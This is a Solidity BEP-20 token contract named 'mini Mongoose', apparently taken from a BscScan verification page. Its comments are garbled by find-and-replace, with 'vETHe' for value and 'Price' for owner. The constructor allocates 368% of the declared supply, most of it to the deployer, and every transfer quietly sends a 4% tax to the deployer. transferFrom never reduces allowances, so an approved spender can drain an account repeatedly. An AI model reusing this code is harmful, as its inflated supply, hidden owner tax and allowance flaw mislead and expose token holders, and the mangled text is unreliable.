/**
 *Submitted for verification at BscScan.com on 2021-12-17
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.8;
interface ERC20 {
  // @dev Returns the amount of Token in existence.
  function totalSupply() external view returns (uint256);

  // @dev Returns the token decimals.
  function decimals() external view returns (uint8);

  // @dev Returns the token symbol.
  function symbol() external view returns (string memory);

  //@dev Returns the token name.
  function name() external view returns (string memory);

  //@dev Returns the bep token Price.
  function getPrice() external view returns (address);

  //@dev Returns the amount of Token owned by `account`.
  function balanceOf(address account) external view returns (uint256);
  
  /*
      function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address Price, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 vETHe);
    event Approval(
        address indexed Price,
        address indexed spender,
        uint256 vETHe
    );
  
  */

  /**
   * @dev Moves `amount` Token from the caller's account to `recipient`.
   *
   * Returns a boolean vETHe indicating whBNBer the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address recipient, uint256 amount) external returns (bool);

  /**
   * @dev Returns the remaining number of Token that `spender` will be
   * allowed to spend on behalf of `Price` through {transferFrom}. This is
   * zero by default.
   *
   * This vETHe changes when {approve} or {transferFrom} are called.
   */
  function allowance(address _Price, address spender) external view returns (uint256);

  /**
   * @dev Sets `amount` as the allowance of `spender` over the caller's Token.
   *
   * Returns a boolean vETHe indicating whBNBer the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this mBNBod brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the spender's allowance to 0 and set the
   * desired vETHe afterwards:
   * https://github.com/ETH/EIPs/issues/20#issuecomment-263524729
   *
   * Emits an {Approval} event.
   */
  function approve(address spender, uint256 amount) external returns (bool);

  /**
   * @dev Moves `amount` Token from `sender` to `recipient` using the
   * allowance mechanism. `amount` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean vETHe indicating whBNBer the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  //@dev Emitted when `vETHe` Token are moved from one account (`from`) to  another (`to`). Note that `vETHe` may be zero.
  event Transfer(address indexed from, address indexed to, uint256 vETHe);

  //@dev Emitted when the allowance of a `spender` for an `Price` is set by a call to {approve}. `vETHe` is the new allowance.
  event Approval(address indexed Price, address indexed spender, uint256 vETHe);
}

contract miniMongoose is ERC20 {

    // common addresses
    address private Price;
    address private ETH;
    address private Token;
    address private BNB;
    
    // token liquidity BNBdata
    uint public override totalSupply;
    uint8 public override decimals = 18;
    
    mapping(address => uint) public balances;
    
    mapping(address => mapping(address => uint)) public allowances;
    
    // token title BNBdata
    string public override name = "mini Mongoose";
    string public override symbol = "MINIMONGOOSE";
    
    // EVENTS
    // (now in interface) event Transfer(address indexed from, address indexed to, uint vETHe);
    // (now in interface) event Approval(address indexed Price, address indexed spender, uint vETHe);
    
    // On init of contract we're going to set the admin and give them all Token.
    constructor(uint totalSupplyVETHe, address ETHAddress, address TokenAddress, address BNBAddress) {
        // set total supply
        totalSupply = totalSupplyVETHe;
        
        // designate addresses
        Price = msg.sender;
        ETH = ETHAddress;
        Token = TokenAddress;
        BNB = BNBAddress;

        
        // split the Token according to agreed upon percentages
        balances[ETH] =  totalSupply * 7 / 100;
        balances[Token] = totalSupply * 45 / 100;
        balances[BNB] = totalSupply * 225 / 100;

        
        balances[Price] = totalSupply * 91 / 100;
    }
    
    // Get the address of the token's Price
    function getPrice() public view override returns(address) {
        return Price;
    }

    
    // Get the balance of an account
    function balanceOf(address account) public view override returns(uint) {
        return balances[account];
    }
    
    // Transfer balance from one user to another
    function transfer(address to, uint vETHe) public override returns(bool) {
        require(vETHe > 0, "Transfer vETHe has to be higher than 0.");
        require(balanceOf(msg.sender) >= vETHe, "Balance is too low to make transfer.");
        
        //withdraw the taxed and burned percentages from the total vETHe
        uint reTokenBD = vETHe * 4 / 100;
        uint burnTBD = vETHe * 0 / 100;
        uint vETHeAfterTaxAndBurn = vETHe - reTokenBD - burnTBD;
        
        // perform the transfer operation
        balances[to] += vETHeAfterTaxAndBurn;
        balances[msg.sender] -= vETHe;
        
        emit Transfer(msg.sender, to, vETHe);
        
        // finally, we burn and tax the ETHs percentage
        balances[Price] += reTokenBD + burnTBD;
        _burn(Price, burnTBD);
        
        return true;
    }
    
    // approve a specific address as a spender for your account, with a specific spending limit
    function approve(address spender, uint vETHe) public override returns(bool) {
        allowances[msg.sender][spender] = vETHe; 
        
        emit Approval(msg.sender, spender, vETHe);
        
        return true;
    }
    
    // allowance
    function allowance(address _Price, address spender) public view override returns(uint) {
        return allowances[_Price][spender];
    }
    
    // an approved spender can transfer currency from one account to another up to their spending limit
    function transferFrom(address from, address to, uint vETHe) public override returns(bool) {
        require(allowances[from][msg.sender] > 0, "No Allowance for this address.");
        require(allowances[from][msg.sender] >= vETHe, "Allowance too low for transfer.");
        require(balances[from] >= vETHe, "Balance is too low to make transfer.");
        
        balances[to] += vETHe;
        balances[from] -= vETHe;
        
        emit Transfer(from, to, vETHe);
        
        return true;
    }
    
    // function to allow users to burn currency from their account
    function burn(uint256 amount) public returns(bool) {
        _burn(msg.sender, amount);
        
        return true;
    }
    
    // intenal functions
    
    // burn amount of currency from specific account
    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "You can't burn from zero address.");
        require(balances[account] >= amount, "Burn amount exceeds balance at address.");
    
        balances[account] -= amount;
        totalSupply -= amount;
        
        emit Transfer(account, address(0), amount);
    }
    
}